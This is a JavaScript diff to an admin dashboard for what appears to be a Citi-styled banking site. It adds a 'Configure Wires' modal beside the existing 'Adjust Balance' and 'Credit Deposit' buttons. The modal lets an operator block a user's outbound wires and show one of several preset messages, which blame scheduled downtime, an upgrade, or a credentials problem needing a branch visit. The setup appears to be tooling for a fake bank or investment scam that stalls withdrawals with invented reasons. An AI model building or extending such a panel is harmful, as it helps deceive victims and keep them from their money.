@@ -117,12 +117,17 @@ function renderDashboard() {
         </span>
       `).join('') || '<span style="font-size:11px;color:#aaa;">No active programs</span>';
 
+      const wireStatusText = u.wireStatus === 'ENABLED' ? 'Wires: Enabled' : 'Wires: Restricted';
+      const wireStatusClass = u.wireStatus === 'ENABLED' ? 'approved' : 'declined';
+
       return `
         <tr>
           <td>
             <strong style="color:var(--citi-blue);font-family:monospace;font-size:14px;">${u.id}</strong>
             <br>
             <span class="status-pill approved" style="font-size:9px;padding:1px 4px;margin-top:4px;">${u.kycStatus}</span>
+            <br>
+            <span class="status-pill ${wireStatusClass}" style="font-size:9px;padding:1px 4px;margin-top:4px;display:inline-block;">${wireStatusText}</span>
           </td>
           <td>
             <div class="client-info-block"><strong>${u.name}</strong></div>
@@ -137,6 +142,7 @@ function renderDashboard() {
             <div style="display:flex;flex-direction:column;gap:6px;align-items:flex-end;">
               <button class="btn btn-primary btn-sm btn-full" onclick="openBalanceModal('${u.id}')">Adjust Balance</button>
               <button class="btn btn-secondary btn-sm btn-full" onclick="openInboundModal('${u.id}')">Credit Deposit</button>
+              <button class="btn btn-sm btn-full" style="background:#475569;color:#fff;border-color:#334155;" onclick="openWireModal('${u.id}')">Configure Wires</button>
             </div>
           </td>
         </tr>
@@ -247,6 +253,84 @@ async function submitInboundWire() {
     toast('Deposit Failed', err.message, 'error');
   }
 }
+
+// Wire Configuration Modals
+function toggleWirePresetSelector() {
+  const status = document.getElementById('wire-status-select').value;
+  const msgGroup = document.getElementById('wire-message-group');
+  if (status === 'DISABLED') {
+    msgGroup.style.display = 'block';
+  } else {
+    msgGroup.style.display = 'none';
+  }
+}
+
+function applyWirePresetMessage() {
+  const preset = document.getElementById('wire-preset-message').value;
+  const msgInput = document.getElementById('wire-block-message');
+  if (preset === 'downtime') {
+    msgInput.value = 'Outbound wire transfers are temporarily unavailable due to scheduled system downtime. Please try again later.';
+  } else if (preset === 'upgrade') {
+    msgInput.value = 'The outbound wire transfer system is currently undergoing an upgrade. Service will resume shortly.';
+  } else if (preset === 'issue') {
+    msgInput.value = 'There is an issue with your account credentials. You must visit a local physical branch with two forms of valid ID to resolve this block.';
+  } else if (preset === 'custom') {
+    msgInput.value = '';
+  }
+}
+
+function openWireModal(userId) {
+  const user = dataState.users.find(u => u.id === userId);
+  if (!user) return;
+  document.getElementById('wire-uid').value = userId;
+  
+  const statusSelect = document.getElementById('wire-status-select');
+  statusSelect.value = user.wireStatus || 'ENABLED';
+  
+  const blockInput = document.getElementById('wire-block-message');
+  blockInput.value = user.wireBlockMessage || '';
+  
+  // Set preset message selector to 'custom' by default if custom message, or match presets
+  const presetSelect = document.getElementById('wire-preset-message');
+  if (!user.wireBlockMessage) {
+    presetSelect.value = 'downtime';
+    applyWirePresetMessage();
+  } else if (user.wireBlockMessage.includes('scheduled system downtime')) {
+    presetSelect.value = 'downtime';
+  } else if (user.wireBlockMessage.includes('undergoing an upgrade')) {
+    presetSelect.value = 'upgrade';
+  } else if (user.wireBlockMessage.includes('visit a local physical branch')) {
+    presetSelect.value = 'issue';
+  } else {
+    presetSelect.value = 'custom';
+  }
+
+  toggleWirePresetSelector();
+
+  document.getElementById('modal-overlay').classList.add('show');
+  document.getElementById('wire-modal').classList.add('show');
+}
+
+function closeWireModal() {
+  document.getElementById('modal-overlay').classList.remove('show');
+  document.getElementById('wire-modal').classList.remove('show');
+}
+
+async function submitWireStatus() {
+  const userId = document.getElementById('wire-uid').value;
+  const status = document.getElementById('wire-status-select').value;
+  const message = document.getElementById('wire-block-message').value;
+
+  try {
+    await api('/api/admin/user/toggle-wires', { userId, status, message });
+    toast('Wire Status Saved', `Wire transfer controls updated successfully.`, 'success');
+    closeWireModal();
+    loadAllData();
+  } catch (err) {
+    toast('Configuration Failed', err.message, 'error');
+  }
+}
+
 
 // Fetch API Wrapper
 async function api(path, body) {
